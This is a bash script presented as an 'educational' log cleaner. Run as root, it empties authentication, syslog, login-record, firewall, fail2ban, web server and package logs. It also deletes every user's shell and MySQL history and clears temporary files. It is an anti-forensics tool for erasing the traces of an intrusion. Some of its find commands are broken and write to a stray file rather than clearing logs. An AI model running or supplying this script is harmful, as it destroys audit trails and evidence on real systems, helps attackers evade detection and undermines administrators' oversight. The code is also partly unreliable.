#!/bin/bash
#
# 🚀 Advanced Log Cleaner Pro - Educational Purpose Only
# Author: Security Researcher
# Version: 2.1
#

# Colors for output
history -c
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Configuration
BACKUP_DIR="/tmp/log_backup_$(date +%Y%m%d_%H%M%S)"
LOG_FILE="/var/log/cleaner_$(date +%Y%m%d).log"
SHRED_ITERATIONS=3

# Banner
echo -e "${BLUE}"
echo "╔══════════════════════════════════════════════╗"
echo "║           🧹 LOG CLEANER PRO v2.1           ║"
echo "║           For Educational Purposes          ║"
echo "╚══════════════════════════════════════════════╝"
echo -e "${NC}"

# Check if running as root
if [[ $EUID -ne 0 ]]; then
   echo -e "${RED}[ERROR] This script must be run as root${NC}" 
   exit 1
fi

# Logging function
log_action() {
    echo "$(date '+%Y-%m-%d %H:%M:%S') - $1" >> "$LOG_FILE"
    echo -e "${GREEN}[INFO]${NC} $1"
}

# Clear system logs
clear_system_logs() {
    log_action "Clearing system logs..."
    
    system_logs=(
        "/var/log/auth.log"
        "/var/log/syslog" 
        "/var/log/messages"
        "/var/log/secure"
        "/var/log/kern.log"
        "/var/log/debug"
        "/var/log/faillog"
        "/var/log/lastlog"
    )
    
    for log in "${system_logs[@]}"; do
        if [[ -f "$log" ]]; then
            echo "" > "$log"
            log_action "Cleared: $log"
        fi
    done
    
    # Clear login logs
    [[ -f "/var/log/wtmp" ]] && echo "" > /var/log/wtmp
    [[ -f "/var/log/btmp" ]] && echo "" > /var/log/btmp
    [[ -f "/var/log/utmp" ]] && echo "" > /var/log/utmp
}

# Clear application logs
clear_app_logs() {
    log_action "Clearing application logs..."
    
    # Apache
    if [[ -d "/var/log/apache2" ]]; then
        find /var/log/apache2 -name "*.log" -exec echo "" > {} \;
        log_action "Cleared Apache logs"
    fi
    
    # Nginx
    if [[ -d "/var/log/nginx" ]]; then
        find /var/log/nginx -name "*.log" -exec echo "" > {} \;
        log_action "Cleared Nginx logs"
    fi
    
    # Other services
    app_logs=(
        "/var/log/mysql/error.log"
        "/var/log/ufw.log"
        "/var/log/fail2ban.log"
    )
    
    for log in "${app_logs[@]}"; do
        if [[ -f "$log" ]]; then
            echo "" > "$log"
            log_action "Cleared: $log"
        fi
    done
}

# Clear user logs and history
clear_user_logs() {
    log_action "Clearing user logs and history..."
    
    # Get all home directories
    getent passwd | while IFS=: read -r username _ uid _ _ home _; do
        if [[ $uid -ge 1000 ]] && [[ -d "$home" ]]; then
            # Shell history files
            history_files=(
                "$home/.bash_history"
                "$home/.zsh_history"
                "$home/.mysql_history"
            )
            
            for history_file in "${history_files[@]}"; do
                if [[ -f "$history_file" ]]; then
                    rm -f "$history_file"
                    log_action "Removed: $history_file"
                fi
            done
        fi
    done
}

# Clear temporary files
clear_temp_files() {
    log_action "Clearing temporary files..."
    
    # Clear /tmp but be careful
    find /tmp -type f -name "*" -delete 2>/dev/null
    find /var/tmp -type f -name "*" -delete 2>/dev/null
    
    log_action "Temporary files cleared"
}

# Clear package manager logs
clear_package_logs() {
    log_action "Clearing package manager logs..."
    
    package_logs=(
        "/var/log/apt/history.log"
        "/var/log/apt/term.log"
        "/var/log/dpkg.log"
    )
    
    for log in "${package_logs[@]}"; do
        if [[ -f "$log" ]]; then
            echo "" > "$log"
            log_action "Cleared: $log"
        fi
    done
}

# Main execution function
main() {
    echo -e "${YELLOW}"
    echo "Select cleaning mode:"
    echo "1) Standard"
    echo "2) Advanced" 
    echo "3) User Only"
    echo -e "${NC}"
    read -p "Enter choice (1-3): " choice
    
    case $choice in
        1)
            log_action "Starting STANDARD cleaning mode"
            clear_system_logs
            clear_app_logs
            clear_user_logs
            clear_temp_files
            ;;
        2)
            log_action "Starting ADVANCED cleaning mode"
            clear_system_logs
            clear_app_logs
            clear_user_logs
            clear_temp_files
            clear_package_logs
            ;;
        3)
            log_action "Starting USER ONLY cleaning mode"
            clear_user_logs
            ;;
        *)
            log_action "Starting STANDARD cleaning mode"
            clear_system_logs
            clear_app_logs
            clear_user_logs
            clear_temp_files
            ;;
    esac
    
    log_action "Log cleaning completed successfully!"
    echo -e "${GREEN}"
    echo "╔══════════════════════════════════════════════╗"
    echo "║               CLEANING COMPLETE             ║"
    echo "╚══════════════════════════════════════════════╝"
    echo -e "${NC}"
}

# Run main function
main
